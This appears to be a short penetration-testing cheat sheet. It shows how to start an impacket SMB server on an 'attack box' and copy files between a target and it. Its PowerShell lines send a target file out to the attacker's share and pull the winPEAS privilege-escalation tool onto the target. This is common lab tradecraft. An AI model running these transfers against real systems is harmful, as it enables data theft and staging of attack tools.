---
tags:
---
# smbserver

Quick SMB server to upload and download files

## Capabilities

```bash
# Setup SMB server
sudo impacket-smbserver -smb2support share $(pwd)
```

Interact with the SMB server from the target's machine

```powershell
# Move file from target to attack box
cp target_file.txt \\192.168.1.18\share\target_file.txt

# Move file from attack box to target
cp \\192.168.1.18\share\winPEASany.exe winPEAS.exe
```
